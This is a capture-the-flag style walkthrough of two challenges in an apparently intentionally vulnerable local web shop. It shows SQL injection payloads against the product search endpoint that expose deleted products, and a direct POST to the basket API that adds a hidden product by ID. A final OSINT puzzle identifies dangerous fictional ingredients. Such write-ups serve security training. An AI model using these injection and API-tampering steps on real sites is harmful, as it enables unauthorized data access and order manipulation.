# Order the Christmas Special Offer of 2014

## 1. Inspect Product Search Requests

1. Open:

   ```
   http://localhost:3000/#/search
   ```

2. Press **F5** and monitor the **Network** tab in DevTools.

3. Identify the request:

   ```
   GET /rest/products/search?q=
   ```

### Observation

- Product data is retrieved through a single request during page load.
- The search bar appears to filter data already loaded on the client side.
- The `q=` parameter appears unnecessary and may be a leftover from an earlier implementation.

### Screenshot

<img width="1902" height="987" alt="image" src="https://github.com/user-attachments/assets/03faf176-eb08-4921-b1d5-02b3a22a1cdb" />

## 2. Verify Search Endpoint

Call the endpoint directly:

```http
http://localhost:3000/rest/products/search?q=orange
```

Expected result:

```json
[
  {
    "name": "Orange Juice",
    ...
  }
]
```

### Screenshot
<img width="1902" height="1035" alt="image" src="https://github.com/user-attachments/assets/9b101f10-3735-4426-879d-269f895e42d1" />


---

## 3. Test for SQL Injection

Submit:

```http
http://localhost:3000/rest/products/search?q=';
```

Expected result:

```text
SQLITE_ERROR: syntax error
```

This confirms that SQL injection is possible.

### Screenshot

![SQLITE_ERROR syntax error](screenshots/sqlite-syntax-error.png)

---

## 4. Retrieve Deleted Products

Testing:

```sql
'--
```

produces:

```text
SQLITE_ERROR: incomplete input
```

because the query contains unbalanced parentheses.

Use:

```sql
'))--
```

Request:

```http
http://localhost:3000/rest/products/search?q='))--
```

Expected result:

- Full product list is returned.
- Logically deleted products become visible.
- Identify:

```text
Christmas Super-Surprise-Box (2014 Edition)
```

Record:

```text
ProductId = 10
```

### Screenshot

![Christmas special product in JSON response](screenshots/christmas-product-id10.png)

---

## 5. Obtain Basket ID

1. Open:

   ```
   http://localhost:3000/#/login
   ```

2. Log in with any valid account.

3. Add a normal product to the basket.

4. Obtain the Basket ID:
   - From a basket-related request in the Network tab, or
   - From Session Storage (`bid` value).

### Screenshot

![Basket ID in Session Storage](screenshots/basket-id.png)

---

## 6. Add the Hidden Product

Send:

```http
POST http://localhost:3000/api/BasketItems
Content-Type: application/json
```

Body:

```json
{
  "BasketId": "<YOUR_BASKET_ID>",
  "ProductId": 10,
  "quantity": 1
}
```

### Screenshot

![POST request adding hidden product](screenshots/add-product-10.png)

---

## 7. Verify Basket Contents

Open:

```
http://localhost:3000/#/basket
```

Confirm that:

```text
Christmas Super-Surprise-Box (2014 Edition)
```

is now present.

### Screenshot

![Basket containing Christmas special](screenshots/basket-christmas-special.png)

---

## 8. Complete the Challenge

Click:

```text
Checkout
```

Challenge solved.

### Screenshot

![Challenge solved notification](screenshots/challenge-completed.png)

---

# Alternative Solution (Without SQL Injection)

## Retrieve Complete Product List

Open:

```http
http://localhost:3000/rest/products/search?q=
```

### Steps

1. Review all returned product IDs.
2. Identify missing IDs in the sequence.
3. For each missing ID, send:

```json
{
  "BasketId": "<YOUR_BASKET_ID>",
  "ProductId": "<MISSING_ID>",
  "quantity": 1
}
```

4. Check the basket after each addition.
5. When the **Christmas Super-Surprise-Box (2014 Edition)** appears, proceed to checkout.

---

# Identify an Unsafe Product

## 1. Enumerate Deleted Products

Continue reviewing deleted products until you find:

```text
Rippertuer Special Juice
```

### Screenshot

![Rippertuer Special Juice product page](screenshots/rippertuer-special-juice.png)

---

## 2. Review Product Description

Warning displayed:

```text
This item has been made unavailable because of lack of safety standards.
```

Visible ingredients:

- Cherymoya (*Annona cherimola*)
- Jabuticaba (*Myrciaria cauliflora*)
- Bael (*Aegle marmelos*)
- Others...

### Screenshot

![Unsafe product description](screenshots/unsafe-product-description.png)

---

## 3. Research the Ingredients

Search for:

```text
Cherymoya Annona cherimola Jabuticaba Myrciaria cauliflora Bael Aegle marmelos
```

Find:

```text
Top 20 Fruits You Probably Don't Know
```

In the comments section, locate a reference to:

```text
Rippertuer Special Juice
```

along with a Pastebin link.

### Screenshot

![Blog comment referencing Rippertuer Special Juice](screenshots/blog-comment-reference.png)

---

## 4. Review the Ingredient List

Open the referenced Pastebin entry:

```text
Rippertuer Special Juice Ingredients
```

Examine the JSON document containing fruit descriptions.

### Screenshot

![Pastebin ingredient list](screenshots/pastebin-ingredients.png)

---

## 5. Identify the Dangerous Combination

One entry mentions:

```text
Hueteroneel
```

with the warning:

```text
this coupled with Eurogium Edule was sometimes found fatal
```

Since **Eurogium Edule** is also present in the ingredient list, these are the hazardous ingredients.

### Dangerous Ingredients

- `Hueteroneel`
- `Eurogium Edule`

### Screenshot

![Ingredient warning identifying dangerous combination](screenshots/dangerous-ingredients.png)

---

## 6. Submit the Report

Open:

```
http://localhost:3000/#/contact
```

Submit a comment containing:

```text
Eurogium Edule
Hueteroneel
```

Challenge solved.

### Screenshot

![Submitted contact form](screenshots/contact-form-submission.png)

### Screenshot

![Challenge solved confirmation](screenshots/final-challenge-success.png)

---

# Summary

## Christmas Special Offer

```text
Product: Christmas Super-Surprise-Box (2014 Edition)
Product ID: 10
```

## Unsafe Juice Ingredients

```text
Hueteroneel
Eurogium Edule
```

## Techniques Used

- Network traffic analysis
- API enumeration
- SQL injection discovery
- Hidden product retrieval
- Basket API manipulation
- Open Source Intelligence (OSINT)
- Ingredient correlation and hazard
